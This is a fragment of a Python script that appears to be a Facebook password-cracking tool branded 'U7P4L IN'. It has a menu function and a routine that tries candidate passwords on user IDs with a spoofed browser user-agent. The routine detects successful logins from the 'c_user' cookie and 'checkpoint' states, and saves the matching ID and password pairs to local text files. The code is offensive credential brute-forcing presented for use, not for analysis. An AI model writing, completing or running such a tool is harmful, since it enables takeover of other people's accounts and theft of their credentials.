...
def riaz():
	...
	if king1 =='5':
		riaz()
	if king1 =='4':
		os.system('xdg-open http://wa.me💕')
	if king1 =='3':
		os.system('xdg-open https://github.com/U7P4L-IN ');riaz()
	if king1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5373.119 Safari/537.36',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[U7P4L IN -OK] '+cid+'|'+ps+'\033[0;97m')
                open('U7P4L IN -OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[U7P4L IN -CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('U7P4L IN -CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mU7P4L IN \033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
